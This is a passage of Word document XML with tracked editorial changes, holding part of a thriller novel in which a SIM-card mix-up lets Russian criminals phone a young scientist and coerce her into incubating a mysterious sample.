            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> she said</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="003169EF" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1936" w:author="TextVet" w:date="2016-03-20T14:51:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Her</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1937" w:author="TextVet" w:date="2016-03-20T14:51:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="003169EF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>wit</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1938" w:author="TextVet" w:date="2016-03-20T14:52:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="003169EF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>h a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tone</w:t>
      </w:r>
      <w:ins w:id="1939" w:author="TextVet" w:date="2016-03-20T14:52:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> had chimed </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1940" w:author="TextVet" w:date="2016-03-20T14:52:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="003169EF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> that made it clear that she rather liked it</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1941" w:author="TextVet" w:date="2016-03-20T14:52:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>something more than approval</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488"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mind filled with a thousand possible responses.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mustered </w:t>
      </w:r>
      <w:del w:id="1942" w:author="TextVet" w:date="2016-03-20T14:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DE5C21">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">up </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>his deepest reserves of confidence, leaned toward her, and said suavely, “Yeah, I am. What are you gonna do about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was actually wondering,” she said as she took a step toward him and looked up into his eyes, “if </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>you’re</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> going to do something about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commentRangeStart w:id="1943"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">He </w:t>
      </w:r>
      <w:ins w:id="1944" w:author="TextVet" w:date="2016-03-20T14:58:00Z">
        <w:r w:rsidR="00AE2445">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">reached, </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1945" w:author="TextVet" w:date="2016-03-20T14:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AE2445">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">laid his hand on her waist to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pull</w:t>
      </w:r>
      <w:ins w:id="1946" w:author="TextVet" w:date="2016-03-20T14:58:00Z">
        <w:r w:rsidR="00AE2445">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> her closer</w:t>
      </w:r>
      <w:ins w:id="1947" w:author="TextVet" w:date="2016-03-20T14:58:00Z">
        <w:r w:rsidR="00AE2445">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> by her waist</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. She eagerly pressed her body against his. The feel of her toned midsection hit his veins like a shot of opium, sending </w:t>
      </w:r>
      <w:commentRangeEnd w:id="1943"/>
      <w:r w:rsidR="00AE2445">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1943"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>his head spinning in blissful delirium. He drew his lips down toward hers. She reciprocated, reaching up to slide her hand across the back of his neck, and guided his face down to meet hers.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watched himself kissing her in an out-of-body experience, the camera of his eye circling around them. The Rite Aid’s muzak became a punk-pop love ballad. Bystanders started applauding. The credits rolled, and they lived happily ever after.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None of that happened.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She had said, “You’re looking at me like that again,” with an inviting smile, her bright eyes looking expectantly at him. He knew he should act. He told himself to act. But he found himself </w:t>
      </w:r>
      <w:del w:id="1948" w:author="TextVet" w:date="2016-03-20T15:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A04FE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">merely </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>standing idly</w:t>
      </w:r>
      <w:ins w:id="1949" w:author="TextVet" w:date="2016-03-20T15:02:00Z">
        <w:r w:rsidR="008F6F2C">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ins w:id="1950" w:author="TextVet" w:date="2016-03-20T15:02:00Z">
        <w:r w:rsidR="008F6F2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>dunce</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>like</w:t>
      </w:r>
      <w:del w:id="1951" w:author="TextVet" w:date="2016-03-20T15:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008F6F2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> a dunce</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, feeling the moment slip away.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="008A04FE" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1952" w:author="TextVet" w:date="2016-03-20T15:03:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A</w:t>
        </w:r>
        <w:r w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">n explosion of noise from Tina’s purse </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>broke t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1953" w:author="TextVet" w:date="2016-03-20T15:03:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="008A04FE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>T</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he awkward tension</w:t>
      </w:r>
      <w:del w:id="1954" w:author="TextVet" w:date="2016-03-20T15:03:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="008A04FE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> was broken by an explosion of noise from Tina’s purse</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488"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both looked in surprise at the bag. From the purse flowed music — a tinny pop song sung in a foreign language.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Perplexed, Tina quickly rummaged through her purse.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Heh. It’s that Eugene guy’s cellphone,” she said. “That’s his ring tone. Check it out.” She held the phone so Danny could see the screen lighting up with, “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Sergey</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eyebrows furrowed in confusion. “Uh, no… That can’t be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“Why?” she asked innocently. “What’s wrong?”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get that the phone would recognize the number and display the name…” Danny said, mostly to himself. “But how would it… Tina, you didn’t put the… thing in the thing… did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what?”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reached into his pocket. He felt the small card he had pulled from the Russian’s cellphone. His face went ashen.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“Jesus, Danny, what is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 SIM’s still in that phone,” he said in horror.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music stopped.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she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SIM determines the phone’s subscriber account,” said Danny. “Your phone number goes where your SIM goes.”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stared at the phone. “Wait. Wait a minute. So what you’re saying…”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music started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Sergey guy isn’t calling Eugene,” said Danny. “He’s calling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blood left Tina’s face. As the phone rang, she stood looking at it — not moving, not breathing.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Finally, she decided to press a button. The music stopped. She brought the phone to her ear and trembled out, “Hello?”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could barely hear the other side of the conversation. He could make out a male voice with a foreign accent.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said, “I’m… I’m sorry…”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voice said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Tina replied meekly. “I haven’t gone to the police.”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voice spoke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I still have it,” she said. “Look, just </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>take</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> it, for all I care! I have zero interest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voice interrupted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I didn’t swap it!” Tina protested. “Or contaminate it, or… Proof? Um, I promise? What kind of proof do you want? I don’t…”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voice grumbled.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“What? No! </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1955" w:author="TextVet" w:date="2016-03-21T11:28:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>I can’t…</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” Tina insisted. The voice responded. As it talked, she began to cry. “No! Please, you don’t have to…”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voice said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choked on a scream. “…I understand…”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voice made a few statements.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She stared into nothingness. Finally, she said,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voice issued a gruff response. Then, after a pause, it said something else.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looked up at Danny. She slowly pulled the phone away from her ear and extended it out to him. “He wants to talk to you,” she whispered.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blinked. “To </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>me</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 slowly, her eyes blank.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the hell…?” Danny protested.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said he wants to speak to the man with the electric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took the phone from her. “…Hello?”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voice, deep and resonant, said, “I understand you are responsible for interrupting our operation.”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took in a sharp breath. “What do you want?”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“For start, you owe me new Tesla Roadster.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>15</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Pain enveloped Mike like a cocoon,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> robbing him of all sense of time or direction. He felt like he was floating in the dark womb of some alien beast. He sat propped up in his hospital bed, covered in gauze, with Moshen and Natalie at his bedside keeping him awake. The pain sent his mind reeling, almost like a drug. The agony was borderline euphoric.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your endorphins kicking in,” Natalie said. “They work on your brain like morphine. That’s where the word ‘endorphin’ comes from, you know — ‘endogenous morphine.’ It’s basically natural heroin. Your body’s protecting itself. Making the damage easier to bear.”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he asked. “Why are you being so nice to me? We just met.”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but I… Uh… You seem pretty cool,” she said, blushing.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1956" w:author="TextVet" w:date="2016-03-21T11:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00095643">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Natalie’s attention was drawn away by </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1957" w:author="TextVet" w:date="2016-03-21T11:36:00Z">
        <w:r w:rsidR="00095643">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1958" w:author="TextVet" w:date="2016-03-21T11:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00095643">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> shadow on the other side of the privacy curtain</w:t>
      </w:r>
      <w:ins w:id="1959" w:author="TextVet" w:date="2016-03-21T11:36:00Z">
        <w:r w:rsidR="00095643">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> stole Natalie’s attention</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. A few distressed voices approached. Mike recognized one of them as the girl from the Tungsten building</w:t>
      </w:r>
      <w:ins w:id="1960" w:author="TextVet" w:date="2016-03-21T11:37:00Z">
        <w:r w:rsidR="006067BF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1961" w:author="TextVet" w:date="2016-03-21T11:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006067BF">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Tina. She was sobbing.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know everything about me, Nat,” she was saying, her voice froggy. “They busted into my car. It was still sitting in the Tungsten parking lot. They got the registration and insurance papers and whatever else was in there. They know my address, my phone number, my Social Security Number…”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materialized beside her, carrying plastic bags. “Jason… I… I’m gonna need hazard pay.”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the hell is going on?” Jason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Russians called Tina,” Danny answered.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said meekly, “They want me to help them incubate the stuff in the Eppendorf tube. They told me to meet them at my apartment in one hour, ‘or else</w:t>
      </w:r>
      <w:ins w:id="1962" w:author="TextVet" w:date="2016-03-21T11:39:00Z">
        <w:r w:rsidR="008362F7">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w:t>
      </w:r>
      <w:del w:id="1963" w:author="TextVet" w:date="2016-03-21T11:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008362F7">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“They think you can incubate it for them?”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Geez. It’s just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xml:space="preserve">. The incubation part is easy,” Tina said. “It’s figuring out what to </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1964" w:author="TextVet" w:date="2016-03-21T11:39:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with them once they’re grown that’s the hard part. You incubate it, you get a warm tub of goo. Great. What do you do with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The only person who knows that, is Julie.”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Yen?”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eyed him suspiciously. “How do you know Julie?”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“Christina, is Julie working for these Russians?”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don’t know</w:t>
      </w:r>
      <w:ins w:id="1965" w:author="TextVet" w:date="2016-03-21T11:40:00Z">
        <w:r w:rsidR="00AF5A18">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1966" w:author="TextVet" w:date="2016-03-21T11:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AF5A18">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del w:id="1967" w:author="TextVet" w:date="2016-03-21T11:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AF5A18">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said Tina. “</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>When that guy was holding me at gunpoint, he implied that she’s not exactly with them willingly.”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they’re trying to threaten you into ending up like her?”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w:t>
      </w:r>
      <w:ins w:id="1968" w:author="TextVet" w:date="2016-03-21T11:41:00Z">
        <w:r w:rsidR="00F57D80">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1969" w:author="TextVet" w:date="2016-03-21T11:43:00Z">
        <w:r w:rsidR="00F57D80">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>weakly</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1970" w:author="TextVet" w:date="2016-03-21T11:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F57D80">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> m</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1971" w:author="TextVet" w:date="2016-03-21T11:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F57D80">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
